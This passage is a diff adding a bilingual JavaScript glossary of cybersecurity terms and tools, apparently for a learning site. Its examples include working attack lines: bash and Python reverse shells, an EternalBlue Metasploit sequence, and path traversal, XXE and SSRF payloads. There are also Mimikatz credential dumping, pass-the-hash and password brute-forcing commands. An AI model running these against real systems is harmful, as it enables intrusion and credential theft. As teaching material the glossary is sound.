+                    explanation: "Escanea continuamente Internet catalogando hosts y certificados. Útil para descubrir infraestructura relacionada con un objetivo.",
+                    example: `# Búsqueda web
+https://search.censys.io
+
+# Por organización
+parsed.names: "Example Inc"
+
+# Por dominio en certificado
+parsed.subject_dn: "ejemplo.com"`,
+                    importance: "Descubre infraestructura y certificados relacionados con un objetivo."
+                },
+                {
+                    title: "Amass",
+                    slug: "amass",
+                    category: "Herramientas",
+                    tags: ["herramientas", "reconocimiento", "subdominios"],
+                    definition: "Herramienta de enumeración de superficie de ataque.",
+                    explanation: "Usa scraping web, APIs, transferencias de zona DNS, certificados, búsquedas recursivas para mapear subdominios y activos relacionados.",
+                    example: `# Enumeración pasiva
+amass enum -passive -d ejemplo.com
+
+# Enumeración activa
+amass enum -d ejemplo.com
+
+# Con todas las fuentes
+amass enum -d ejemplo.com -src`,
+                    importance: "Una de las herramientas más completas para descubrir subdominios."
+                },
+                {
+                    title: "Feroxbuster",
+                    slug: "feroxbuster",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "fuzzing"],
+                    definition: "Fuzzer de contenido web rápido escrito en Rust.",
+                    explanation: "Descubre directorios y archivos ocultos. Extremadamente rápido, recursivo automático, filtros inteligentes.",
+                    example: `# Escaneo básico
+feroxbuster -u http://target.com -w wordlist.txt
+
+# Recursivo con extensiones
+feroxbuster -u http://target.com -w wordlist.txt -x php,html,js
+
+# Filtrar por código
+feroxbuster -u http://target.com -w wordlist.txt -C 404`,
+                    importance: "Descubre recursos ocultos de forma muy rápida gracias a Rust."
+                },  {
+                    title: "FFUF",
+                    slug: "ffuf",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "fuzzing"],
+                    definition: "Fast web fuzzer escrito en Go.",
+                    explanation: "Fuzzing de directorios, archivos, parámetros, subdominios, vhosts. Extremadamente versátil y rápido.",
+                    example: `# Directorios
+ffuf -u http://target.com/FUZZ -w wordlist.txt
+
+# Subdominios
+ffuf -u http://FUZZ.target.com -w subdomains.txt
+
+# Parámetros GET
+ffuf -u http://target.com/page?FUZZ=test -w params.txt`,
+                    importance: "Herramienta de fuzzing extremadamente versátil y rápida."
+                },
+                {
+                    title: "Nuclei",
+                    slug: "nuclei",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "escaneo"],
+                    definition: "Escáner de vulnerabilidades basado en templates.",
+                    explanation: "Usa templates YAML para detectar vulnerabilidades. Comunidad activa creando templates. Actualización constante de signatures.",
+                    example: `# Escaneo básico
+nuclei -u https://target.com
+
+# Con templates específicos
+nuclei -u https://target.com -t cves/
+
+# Lista de URLs
+nuclei -l urls.txt`,
+                    importance: "Detecta rápidamente vulnerabilidades conocidas usando templates de la comunidad."
+                },
+                {
+                    title: "Masscan",
+                    slug: "masscan",
+                    category: "Herramientas",
+                    tags: ["herramientas", "redes", "escaneo"],
+                    definition: "Escáner de puertos TCP extremadamente rápido.",
+                    explanation: "Capaz de escanear todo Internet en menos de 6 minutos. Similar a Nmap pero mucho más rápido para escaneos masivos.",
+                    example: `# Escaneo rápido
+masscan 192.168.1.0/24 -p80,443,8080 --rate=10000
+
+# Todos los puertos
+masscan 192.168.1.0/24 -p0-65535 --rate=10000
+
+# Guardar resultados
+masscan 192.168.1.0/24 -p80 -oL output.txt`,
+                    importance: "Escaneo de puertos a escala masiva en tiempos récord."
+                },
+                {
+                    title: "Enum4linux",
+                    slug: "enum4linux",
+                    category: "Herramientas",
+                    tags: ["herramientas", "windows", "enumeración"],
+                    definition: "Herramienta para enumerar información de sistemas Windows.",
+                    explanation: "Obtiene información de sistemas Windows/Samba vía SMB. Lista usuarios, shares, políticas, grupos, SIDs.",
+                    example: `# Enumeración completa
+enum4linux -a 192.168.1.10
+
+# Solo usuarios
+enum4linux -U 192.168.1.10
+
+# Solo shares
+enum4linux -S 192.168.1.10`,
+                    importance: "Extrae información valiosa de sistemas Windows para reconocimiento."
+                },
+                {
+                    title: "OWASP ZAP",
+                    slug: "owasp-zap",
+                    category: "Herramientas",
+                    tags: ["herramientas", "web", "proxy"],
+                    definition: "Zed Attack Proxy - Herramienta de seguridad web open source.",
+                    explanation: "Alternativa gratuita a Burp Suite. Incluye proxy, spider, scanner activo/pasivo, fuzzer. Mantenido por OWASP.",
+                    example: `# Modo daemon para CI/CD
+zap.sh -daemon -port 8080
+
+# Escaneo automatizado
+zap-cli quick-scan -s xss,sqli http://target.com
+
+# Spider + scan
+zap-cli spider http://target.com
+zap-cli active-scan http://target.com`,
+                    importance: "Suite completa de seguridad web gratuita, ideal para integración en CI/CD."
+                }
+],
+            en: [
+
+                {
+        title: "Nmap",
+        slug: "nmap",
+        category: "Tools",
+        tags: ["tools", "networks", "scanning", "reconnaissance"],
+        definition: "Network Mapper - Open-source tool for network exploration and security auditing.",
+        explanation: "Allows discovering active hosts in a network, identifying open ports, determining services and running versions, and detecting operating systems. It uses various scan types (TCP SYN, TCP Connect, UDP, etc.) and can run NSE (Nmap Scripting Engine) scripts for specific vulnerability detection. It is the standard tool for the reconnaissance phase in pentesting.",
+        example: `nmap -sS -sV -O 192.168.1.0/24
+nmap -p- --min-rate 10000 target.com
+nmap --script vuln target.com`,
+        importance: "Fundamental in any security audit, it allows mapping the attack surface and is the first step in most penetration tests. Its versatility and accuracy make it indispensable."
+    },
+    {
+        title: "Burp Suite",
+        slug: "burp-suite",
+        category: "Tools",
+        tags: ["tools", "web", "proxy", "testing"],
+        definition: "Integrated platform for performing security testing on web applications.",
+        explanation: "Works as an intercepting proxy that allows analyzing and modifying HTTP/HTTPS traffic between the browser and the server. It includes modules such as Spider (automatic crawling), Scanner (vulnerability detection), Intruder (automated attacks), Repeater (manual request modification), and Decoder/Comparer for data analysis. The Professional version adds advanced automated scanning.",
+        example: `1. Configure browser proxy (127.0.0.1:8080)
+2. Intercept request in Proxy > Intercept
+3. Send to Repeater to modify
+4. Send to Intruder for fuzzing`,
+        importance: "It is the de facto standard in web pentesting. It allows identifying and exploiting most web vulnerabilities efficiently, both manually and automatically."
+    },
+    {
+        title: "Metasploit",
+        slug: "metasploit",
+        category: "Tools",
+        tags: ["tools", "exploitation", "framework", "pentesting"],
+        definition: "Penetration testing framework that provides information about vulnerabilities and facilitates exploit development and execution.",
+        explanation: "Includes an extensive database of public exploits, payloads, encoders, and auxiliary modules. It automates many phases of pentesting, from reconnaissance to post-exploitation. It uses a Ruby-based module language and offers both CLI (msfconsole) and GUI interfaces. It integrates tools like Meterpreter, an advanced payload that provides full control over the compromised system.",
+        example: `msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit`,
+        importance: "It dramatically speeds up the exploitation process and is essential to validate the real criticality of discovered vulnerabilities. Its exploit database is constantly updated."
+    },
+    {
+        title: "Reverse Shell",
+        slug: "reverse-shell",
+        category: "Techniques",
+        tags: ["techniques", "exploitation", "persistence"],
+        definition: "Reverse shell connection where the compromised machine connects back to the attacker.",
+        explanation: "Unlike a bind shell (which opens a port on the victim), the reverse shell makes the victim initiate the connection to the attacker. This is useful for bypassing firewalls since outbound connections are usually less restricted. It can be implemented in multiple languages (bash, python, netcat, powershell) and is one of the most common post-exploitation techniques.",
+        example: `# Attacker listening
+nc -lvnp 4444
+
+# Victim connects (bash)
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'`,
+        importance: "Provides remote access to the compromised system in a stealthy way. It is a common goal after exploiting an initial vulnerability."
+    },
+    {
+        title: "Privilege Escalation",
+        slug: "privilege-escalation",
+        category: "Techniques",
+        tags: ["techniques", "exploitation", "linux", "windows"],
+        definition: "Process of obtaining higher privileges than initially granted on a compromised system.",
+        explanation: "After gaining initial access (usually low-privileged user), the goal is to escalate to root/SYSTEM. Techniques include kernel exploits, misconfigured SUID binaries, insecure scheduled tasks, hardcoded credentials, incorrect sudo permissions, and misconfigured services. Tools like LinPEAS and WinPEAS automate privilege escalation discovery.",
+        example: `# Find SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Misconfigured sudo
+sudo -l
+sudo /usr/bin/vim -c ':!/bin/sh'
+
+# Kernel exploit
+uname -a
+searchsploit linux kernel 4.4.0`,
+        importance: "Turning limited access into full system control is crucial for data exfiltration, persistence, and lateral movement."
+    },
+    {
+        title: "Directory Traversal",
+        slug: "directory-traversal",
+        category: "Web",
+        tags: ["web", "vulnerability", "file-inclusion"],
+        definition: "Vulnerability that allows access to files and directories outside the web server’s root directory.",
+        explanation: "Also known as Path Traversal, it exploits improper validation of file paths. Using sequences like '../', an attacker can navigate up the directory structure and access sensitive system files such as /etc/passwd, configuration files, logs, or source code. Variants include URL encoding, Unicode encoding, and double encoding to bypass filters.",
+        example: `https://example.com/file?path=../../../../etc/passwd
+
+# URL encoded
+..%2f..%2f..%2fetc%2fpasswd
+
+# Double encoded
+..%252f..%252f..%252fetc%252fpasswd`,
+        importance: "Can expose critical system information, credentials, source code, and private keys. In combination with other vulnerabilities, it may lead to RCE."
+    }, 
+     {
+        title: "2FA",
+        slug: "2fa",
+        category: "Defensive",
+        tags: ["defensive", "authentication", "security"],
+        definition: "Two-Factor Authentication - Authentication method that requires two different factors to verify a user's identity.",
+        explanation: "Combines something you know (password) with something you have (physical device, authentication app) or something you are (biometrics). Common methods include: TOTP (Time-based One-Time Password like Google Authenticator), SMS (less secure), hardware tokens (YubiKey), and push notifications. It mitigates phishing and credential theft attacks, although SMS-based methods are vulnerable to SIM swapping.",
+        example: `# Configure TOTP
+1. Scan QR code with Google Authenticator
+2. Enter 6-digit code
+3. Save backup codes
+
+# Common bypass: Session fixation, OAuth misconfiguration`,
+        importance: "It drastically reduces the risk of account compromise. Even if credentials are stolen, the attacker still needs the second factor. It is a fundamental defense recommended for all critical services."
+    },
+    {
+        title: "0day",
+        slug: "0day",
+        category: "Concepts",
+        tags: ["concepts", "vulnerability", "exploits"],
+        definition: "Publicly unknown vulnerability with no available patch, or an exploit used before a fix exists.",
+        explanation: "The term 'zero day' refers to developers having zero days to fix the vulnerability before it is exploited. They are extremely valuable on the black market (can sell for millions of dollars). 0day exploits are used by APTs (Advanced Persistent Threats), government agencies, and sophisticated cybercriminals.",
+        example: `Historical examples:
+- EternalBlue (NSA, used in WannaCry)
+- Stuxnet (multiple 0days against SCADA)
+- Pegasus (iOS/Android 0days)
+
+Market: $100k - $5M depending on target`,
+        importance: "They represent the highest level of threat because there is no direct defense. Organizations rely on defense in depth, anomaly detection, and rapid incident response."
+    },
+    {
+        title: "Phishing",
+        slug: "phishing",
+        category: "Social Engineering",
+        tags: ["social-engineering", "attack", "credentials"],
+        definition: "Social engineering technique aimed at tricking victims into revealing sensitive information or performing malicious actions.",
+        explanation: "Typically via emails, SMS (smishing), or calls (vishing) impersonating legitimate entities. Attacks range from mass campaigns to spear phishing (targeted individuals) and whaling (executives). Advanced techniques include cloned websites, typosquatting domains, and abuse of legitimate hosting services.",
+        example: `Fake email:
+From: security@bank0.com (note zero)
+Subject: Account suspension - Action required
+
+Cloned site:
+https://login-microsoft.com.secure-verify.tk`,
+        importance: "It remains one of the most effective attack vectors (>90% of breaches start with phishing). It requires low technical skill but high social engineering skill."
+    },
+    {
+        title: "OSINT",
+        slug: "osint",
+        category: "Reconnaissance",
+        tags: ["reconnaissance", "intelligence", "passive"],
+        definition: "Open Source Intelligence - Collection of information from publicly available sources.",
+        explanation: "Includes search engines, social networks, public databases, DNS/WHOIS records, GitHub, paste sites, SSL certificates, and more. Tools like theHarvester, Maltego, Shodan, and Recon-ng automate this process. It is a critical passive reconnaissance phase that does not generate traffic to the target, minimizing detection risk.",
+        example: `# theHarvester
+theHarvester -d example.com -b all
+
+# Shodan
+shodan search org:"Target Company"
+
+# Google Dorking
+site:example.com filetype:pdf`,
+        importance: "It provides valuable information without alerting the target: employees, technologies, infrastructure, previous leaks, and external attack surface. It is legal and ethical in most contexts."
+    },
+    {
+        title: "Lateral Movement",
+        slug: "lateral-movement",
+        category: "Techniques",
+        tags: ["techniques", "post-exploitation", "networks"],
+        definition: "Techniques used to move between systems inside a network after initial compromise.",
+        explanation: "After compromising one system, attackers pivot to others to reach high-value targets. Common techniques include Pass-the-Hash, Pass-the-Ticket (Kerberos), SMB/WMI/PsExec abuse, stolen credentials, and trust exploitation between systems. Tools like Mimikatz, CrackMapExec, and Impacket facilitate this movement.",
+        example: `# Pass-the-Hash with CrackMapExec
+crackmapexec smb 192.168.1.0/24 -u Administrator -H <HASH>
+
+# PsExec
+psexec.py DOMAIN/user@target cmd.exe
+
+# Mimikatz
+mimikatz.exe "sekurlsa::logonpasswords"`,
+        importance: "This is how attackers move from a low-value entry point to critical systems (Domain Controllers, databases, financial systems). Essential for both attackers and red teams."
+    },
+    {
+        title: "Wireshark",
+        slug: "wireshark",
+        category: "Tools",
+        tags: ["tools", "networks", "analysis", "forensics"],
+        definition: "Open-source network protocol analyzer that allows capturing and inspecting network traffic in detail.",
+        explanation: "It captures network packets in real time and allows deep inspection of hundreds of protocols. Useful for forensic analysis, network troubleshooting, malware detection, encrypted traffic analysis (with keys), and application debugging. Supports complex filters (BPF and display filters) to isolate specific traffic.",
+        example: `# Capture HTTP traffic
+http.request.method == "POST"
+
+# Find credentials in cleartext
+http contains "password"
+
+# Filter by IP
+ip.addr == 192.168.1.100`,
+        importance: "Fundamental for understanding network communications, identifying malicious traffic, extracting transferred files, and protocol analysis. Essential in incident response and forensics."
+    },
+    {
+        title: "John the Ripper",
+        slug: "john-the-ripper",
+        category: "Tools",
+        tags: ["tools", "cracking", "password"],
+        definition: "Highly versatile and fast password auditing and hash cracking tool.",
+        explanation: "Supports hundreds of hash formats (MD5, SHA, bcrypt, NTLM, etc.) and encryption types. Includes attack modes: dictionary, brute force, incremental, and rule-based mutations. The Jumbo version adds extended format support. It can leverage GPU acceleration for faster cracking.",
+        example: `# Crack /etc/shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=rockyou.txt hashes.txt
+
+# Use rules
+john --wordlist=dict.txt --rules hashes.txt`,
+        importance: "Weak passwords are one of the main vulnerabilities. John is essential for auditing password strength and completing attack chains after obtaining hashes."
+    },
+    {
+        title: "Hydra",
+        slug: "hydra",
+        category: "Tools",
+        tags: ["tools", "bruteforce", "password", "networks"],
+        definition: "Brute-force attack tool for network service credentials.",
+        explanation: "Supports more than 50 protocols including SSH, FTP, HTTP(S), SMB, RDP, SMTP, MySQL, PostgreSQL, etc. It allows dictionary attacks, username/password combinations, and parallel execution for speed. Highly configurable in threads, timeouts, and success conditions.",
+        example: `# SSH bruteforce
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# HTTP POST form
+hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`,
+        importance: "Default and weak credentials remain a common entry point. Hydra helps identify them quickly in security audits."
+    },
+    {
+        title: "XXE",
+        slug: "xxe",
+        category: "Web",
+        tags: ["web", "vulnerability", "xml", "injection"],
+        definition: "XML External Entity vulnerability that allows attackers to interfere with XML data processing.",
+        explanation: "Occurs when a poorly configured XML parser processes external entities defined in an XML document. It can allow reading local files, SSRF attacks to internal networks, DoS via billion laughs attack, and sometimes RCE. Exploitation relies on defining XML entities that the parser expands.",
+        example: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+
+<!-- SSRF -->
+<!ENTITY xxe SYSTEM "http://internal.local/secret">`,
+        importance: "Can expose sensitive system files, source code, configurations, and credentials. SSRF impact can lead to full internal network compromise."
+    },
+    {
+        title: "IDOR",
+        slug: "idor",
+        category: "Web",
+        tags: ["web", "vulnerability", "access-control"],
+        definition: "Insecure Direct Object Reference - Access control flaw allowing access to other users' objects by modifying identifiers.",
+        explanation: "Occurs when an application exposes internal object references (user IDs, file IDs, document IDs) without verifying authorization. By changing parameters like user_id=123 to user_id=124, attackers can access other users' data. Common in REST APIs and sequential ID systems.",
+        example: `# Invoice access
+GET /api/invoice/1234 → Your invoice
+GET /api/invoice/1235 → IDOR: another user's invoice
+
+# Profile modification
+POST /user/update
+{"user_id": 999, "role": "admin"}`,
+        importance: "One of the most common vulnerabilities in modern applications. It can lead to unauthorized data access and privilege escalation."
+    },
+    {
+        title: "SSRF",
+        slug: "ssrf",
+        category: "Web",
+        tags: ["web", "vulnerability", "networks"],
+        definition: "Server-Side Request Forgery vulnerability allowing attackers to force the server to make arbitrary HTTP requests.",
+        explanation: "The server acts as an unintended proxy. This allows access to internal services (like AWS metadata at 169.254.169.254), internal ports, localhost services, and network scanning. It can also access file:// resources in some cases.",
+        example: `# AWS metadata
+http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Internal port scan
+http://vulnerable.com/fetch?url=http://192.168.1.5:22`,
+        importance: "Allows pivoting from external web apps into internal networks and cloud environments, potentially stealing credentials and sensitive data."
+    },   {
+        title: "Hash",
+        slug: "hash",
+        category: "Cryptography",
+        tags: ["cryptography", "password", "security"],
+        definition: "Cryptographic function that converts input data into a fixed-length string unique to that content.",
+        explanation: "Hashes are deterministic and one-way, meaning the same input always produces the same output, but it is not feasible to retrieve the original input from the hash. They are used to store passwords (with salt and secure algorithms like bcrypt) and to verify file integrity. Older algorithms like MD5 or SHA1 are vulnerable to collisions and should not be used in critical contexts.",
+        example: `# Generate MD5 hash
+echo -n "password" | md5sum
+
+# Verify file integrity
+sha256sum file.iso`,
+        importance: "Fundamental in security to protect credentials and ensure data integrity. Misuse can completely compromise system security."
+    },
+    {
+        title: "Brute Force",
+        slug: "brute-force",
+        category: "Attacks",
+        tags: ["attack", "password", "credentials"],
+        definition: "Attack consisting of systematically trying multiple credential combinations until the correct one is found.",
+        explanation: "It can be pure brute force (all possible combinations) or dictionary-based attacks using common passwords. Tools like Hydra automate these attacks against multiple services. Effectiveness depends on password complexity and defenses like rate limiting, CAPTCHA, or account lockout.",
+        example: `# SSH attack with Hydra
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+
+# HTTP POST attack
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`,
+        importance: "Still one of the most effective methods against poorly protected services. Essential to understand both for attacks and defense."
+    },
+    {
+        title: "Firewall",
+        slug: "firewall",
+        category: "Defensive",
+        tags: ["networks", "security", "defense"],
+        definition: "Security system that monitors and controls network traffic based on defined rules.",
+        explanation: "Acts as a barrier between trusted and untrusted networks, filtering packets based on IP, ports, protocols, or even behavior. There are network and host-based firewalls, and NGFWs that include deep packet inspection (DPI) and advanced threat detection.",
+        example: `# Allow HTTP/HTTPS
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Block everything else
+iptables -A INPUT -j DROP`,
+        importance: "One of the first lines of defense in any infrastructure. Misconfiguration can expose critical services."
+    },
+    {
+        title: "VPN",
+        slug: "vpn",
+        category: "Networks",
+        tags: ["networks", "privacy", "security"],
+        definition: "Technology that creates an encrypted tunnel between a client and a server over a public network.",
+        explanation: "It protects confidentiality and integrity of traffic by hiding the user's real IP. It is widely used for secure remote access to corporate networks and to protect communications on insecure networks. Common protocols include OpenVPN, WireGuard, and IPsec.",
+        example: `# OpenVPN connection
+openvpn --config client.ovpn`,
+        importance: "Essential for protecting communications in untrusted environments and enabling secure remote access."
+    },
+    {
+        title: "Malware",
+        slug: "malware",
+        category: "Malware",
+        tags: ["malware", "attack"],
+        definition: "Software designed to infiltrate, damage, or compromise systems without user knowledge.",
+        explanation: "Includes multiple categories such as viruses, trojans, ransomware, spyware, and rootkits. It can spread via phishing, malicious downloads, or vulnerability exploitation. Its goals range from data theft to full system control.",
+        example: `# Typical example
+Email attachment in phishing campaign that installs a trojan`,
+        importance: "The main attack vector in real-world scenarios. Understanding it is key for both defense and forensic analysis."
+    },
+    {
+        title: "Exploit",
+        slug: "exploit",
+        category: "Concepts",
+        tags: ["vulnerability", "exploitation"],
+        definition: "Code or technique that takes advantage of a vulnerability to perform unauthorized actions on a system.",
+        explanation: "An exploit turns a vulnerability into a real attack. It may allow code execution, privilege escalation, or unauthorized access. Exploits are classified as local, remote, client-side, etc., and are often integrated into frameworks like Metasploit.",
+        example: `# Search exploit
+searchsploit vsftpd
+
+# Metasploit usage
+use exploit/unix/ftp/vsftpd_234_backdoor`,
+        importance: "It is the element that turns a flaw into an actual threat. Without an exploit, a vulnerability is not always actionable."
+    },
+    {
+        title: "Sniffing",
+        slug: "sniffing",
+        category: "Networks",
+        tags: ["networks", "attack", "analysis"],
+        definition: "Technique of capturing and inspecting network packets.",
+        explanation: "It allows real-time or stored traffic analysis. If data is not encrypted, credentials, cookies, or sensitive information can be exposed. It is used both for legitimate analysis and attacks.",
+        example: `# Wireshark filter
+http contains "password"`,
+        importance: "Highlights the importance of encryption in communications. Without HTTPS, data can be easily intercepted."
+    },
+    {
+        title: "MITM",
+        slug: "mitm",
+        category: "Attacks",
+        tags: ["attack", "networks"],
+        definition: "Attack in which an attacker intercepts communication between two parties.",
+        explanation: "The attacker can eavesdrop, modify, or redirect traffic without detection. Common techniques include ARP spoofing, DNS spoofing, and rogue access points.",
+        example: `# ARP spoofing
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`,
+        importance: "Breaks confidentiality and integrity of communication, especially in insecure networks."
+    },
+    {
+        title: "JWT",
+        slug: "jwt",
+        category: "Web",
+        tags: ["auth", "token"],
+        definition: "JSON-based token used to transmit authenticated information between client and server.",
+        explanation: "It consists of header, payload, and signature. It is widely used in API authentication. If signature validation is weak or algorithms are misconfigured, it can be tampered with.",
+        example: `# Header example
+{"alg":"HS256","typ":"JWT"}`,
+        importance: "Very common in modern applications. Improper implementation can lead to unauthorized access."
+    },
+    {
+        title: "Fuzzing",
+        slug: "fuzzing",
+        category: "Techniques",
+        tags: ["testing", "attack"],
+        definition: "Technique of sending random or malformed data to discover application failures.",
+        explanation: "It is used to identify vulnerabilities such as buffer overflows, validation errors, or unexpected behavior. Tools like Burp Intruder automate fuzzing processes.",
+        example: `# Fuzzing with ffuf
+ffuf -u http://target/FUZZ -w wordlist.txt`,
+        importance: "Helps discover vulnerabilities that are not easily found through manual analysis."
+    },
+    {
+        title: "RCE",
+        slug: "rce",
+        category: "Vulnerability",
+        tags: ["exploitation"],
+        definition: "Vulnerability that allows an attacker to execute arbitrary code on a remote system.",
+        explanation: "It is one of the most critical vulnerabilities because it grants full control over the affected system. It may arise from input validation flaws, insecure deserialization, or software bugs.",
+        example: `# Remote execution
+; whoami`,
+        importance: "Represents full system compromise and is a primary target in penetration testing."
+    },
+    {
+        title: "API",
+        slug: "api",
+        category: "Concepts",
+        tags: ["web", "backend"],
+        definition: "Interface that allows communication between different systems or applications.",
+        explanation: "It defines how software components interact via requests and responses, usually over HTTP/HTTPS. Modern APIs are typically REST or GraphQL and are frequent pentesting targets due to authentication or validation flaws.",
+        example: `GET /api/users
+POST /api/login`,
+        importance: "Core of many modern applications, and poor implementation can expose critical functionality."
+    },
+    {
+        title: "Rate Limiting",
+        slug: "rate-limiting",
+        category: "Defensive",
+        tags: ["defense", "web"],
+        definition: "Mechanism that limits the number of requests a user can make in a given time period.",
+        explanation: "Used to prevent abuse such as brute force attacks, scraping, or DoS. It can be implemented per IP, user, or token and often includes temporary bans or CAPTCHA.",
+        example: `Maximum 5 login attempts per minute`,
+        importance: "Significantly reduces automated attack impact and protects system resources."
+    },
+    {
+        title: "CVE",
+        slug: "cve",
+        category: "Concepts",
+        tags: ["vulnerability"],
+        definition: "Unique identifier assigned to publicly known security vulnerabilities.",
+        explanation: "It standardizes vulnerability tracking and helps with patch management. Each CVE includes technical details, impact, and references to patches or exploits.",
+        example: `CVE-2021-44228 (Log4Shell)`,
+        importance: "Essential for vulnerability management and patch prioritization."
+    },
+    {
+        title: "Searchsploit",
+        slug: "searchsploit",
+        category: "Tools",
+        tags: ["tools", "exploits"],
+        definition: "Tool that allows searching local exploit database (Exploit-DB).",
+        explanation: "It helps quickly identify available exploits for specific software versions discovered during reconnaissance. It is integrated into Kali Linux.",
+        example: `searchsploit apache 2.4.49`,
+        importance: "Speeds up exploitation phase by quickly finding usable code."
+    },
+    {
+        title: "Enumeration",
+        slug: "enumeration",
+        category: "Reconnaissance",
+        tags: ["reconnaissance"],
+        definition: "Process of gathering detailed information about services and systems after initial scanning.",
+        explanation: "Unlike basic reconnaissance, it focuses on identifying users, shares, exact versions, and configurations. It is key to finding exploitable attack vectors.",
+        example: `enum4linux -a 192.168.1.100
+rpcclient -U "" 192.168.1.100`,
+        importance: "Turns general information into actionable data for exploitation."
+    },
+    {
+        title: "Cookie",
+        slug: "cookie",
+        category: "Web",
+        tags: ["web", "auth"],
+        definition: "Small piece of data stored in the browser used to maintain session state.",
+        explanation: "Cookies help identify users and maintain sessions. If not properly protected (HttpOnly, Secure), they can be stolen via XSS leading to session hijacking.",
+        example: `Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure`,
+        importance: "Essential for web authentication but also a major attack target."
+    },
+    {
+        title: "Session",
+        slug: "session",
+        category: "Web",
+        tags: ["auth"],
+        definition: "State maintained between client and server to identify authenticated users.",
+        explanation: "Usually managed via cookies or tokens. Poor session management can lead to session fixation or hijacking attacks.",
+        example: `User logs in and receives a session ID`,
+        importance: "Key mechanism for controlling access to protected resources."
+    },
+    {
+        title: "DoS",
+        slug: "dos",
+        category: "Attacks",
+        tags: ["attack"],
+        definition: "Attack aimed at making a service unavailable by overwhelming its resources.",
+        explanation: "It can be performed by sending massive requests or exploiting resource-heavy vulnerabilities. It does not necessarily require multiple machines.",
+        example: `Sending thousands of HTTP requests to a server`,
+        importance: "Can cause severe service disruption in critical systems."
+    },
+    {
+        title: "DDoS",
+        slug: "ddos",
+        category: "Attacks",
+        tags: ["attack"],
+        definition: "Distributed attack using multiple systems to overwhelm a service.",
+        explanation: "It uses botnets to generate massive traffic from many sources, making mitigation harder. It can target applications, networks, or full infrastructures.",
+        example: `Botnet sending traffic to target website`,
+        importance: "Much harder to mitigate than DoS and can take down large services."
+    },
+    {
+        title: "Zero-Day",
+        slug: "zero-day",
+        category: "Vulnerability",
+        tags: ["vulnerability", "exploitation"],
+        definition: "Publicly unknown vulnerability with no available patch.",
+        explanation: "Attackers can exploit it before the vendor is aware or can fix it. These are highly valuable and often used in advanced targeted attacks.",
+        example: `Unknown exploit used in targeted attack`,
+        importance: "Extremely dangerous due to lack of available defense."
+    },
+    {
+        title: "Defense in Depth",
+        slug: "defense-in-depth",
+        category: "Concepts",
+        tags: ["defense"],
+        definition: "Security strategy based on multiple layers of protection.",
+        explanation: "If one layer fails (e.g., firewall), others still protect the system (IDS, authentication, monitoring). It reduces the likelihood of full compromise.",
+        example: `Firewall + IDS + authentication + monitoring`,
+        importance: "Key principle in secure system design."
+    }, 
+    {
+    title: "Threat",
+    slug: "threat",
+    category: "Concepts",
+    tags: ["risk", "interview"],
+    definition: "Any entity or event with the capability of causing harm to a system, organization, or asset.",
+    explanation: "A threat can be an external attacker, an internal employee, malware, or even a natural disaster. It does not imply that the attack will occur, only that there is a possibility. In cybersecurity, threats are analyzed together with vulnerabilities to assess real risk.",
+    example: `Common threats:
+- Hacker attempting unauthorized access
+- Malware infecting systems
+- Employee leaking internal data`,
+    importance: "It is the foundation of risk analysis. Without threats, there is no risk, and understanding them is key in any security assessment."
+},
+{
+    title: "Vulnerability",
+    slug: "vulnerability",
+    category: "Concepts",
+    tags: ["risk", "interview"],
+    definition: "A weakness in a system that can be exploited by a threat.",
+    explanation: "Vulnerabilities can be technical (outdated software, misconfigurations) or human (user errors). By themselves they do not cause damage, but when combined with a threat they can lead to a security incident.",
+    example: `Examples:
+- Unpatched software (known CVE)
+- Weak passwords
+- Misconfigured permissions`,
+    importance: "They are the entry point for attacks. Identifying and fixing them is one of the main tasks in cybersecurity."
+},
+{
+    title: "Risk",
+    slug: "risk",
+    category: "Concepts",
+    tags: ["risk", "interview"],
+    definition: "The likelihood that a threat exploits a vulnerability causing negative impact.",
+    explanation: "Risk is calculated by combining the likelihood of exploitation and the impact it would have. Not all vulnerabilities have the same risk: a critical one in an exposed system is more urgent than one in an isolated system.",
+    example: `Risk = Likelihood × Impact
+
+Example:
+- High likelihood + high impact → Critical risk
+- Low likelihood + low impact → Low risk`,
+    importance: "It allows prioritizing security efforts and deciding which vulnerabilities should be fixed first."
+},
+{
+    title: "Asset",
+    slug: "asset",
+    category: "Concepts",
+    tags: ["risk", "interview"],
+    definition: "Any resource of value to an organization that must be protected.",
+    explanation: "Assets include data, systems, applications, infrastructure, and people. Not all assets have the same value: a customer database is more critical than a test machine. Identifying assets is the first step in any security strategy.",
+    example: `Examples:
+- Customer database
+- Production server
+- Access credentials`,
+    importance: "All security revolves around protecting assets. Without properly identifying them, an effective strategy cannot be applied."
+},
+{
+    title: "Attack Surface",
+    slug: "attack-surface",
+    category: "Concepts",
+    tags: ["risk", "interview"],
+    definition: "The total set of entry points that an attacker can use to compromise a system.",
+    explanation: "It includes open ports, web applications, APIs, exposed services, and any possible interaction with the system. The larger the attack surface, the higher the probability of finding vulnerabilities.",
+    example: `Example of attack surface:
+- Public web application
+- Exposed API
+- Open SSH port
+- Accessible internal services`,
+    importance: "Reducing the attack surface is one of the most effective ways to improve security."
+},
+{
+    title: "Least Privilege",
+    slug: "least-privilege",
+    category: "Concepts",
+    tags: ["defense", "interview"],
+    definition: "Security principle stating that a user or system should have only the minimum permissions necessary.",
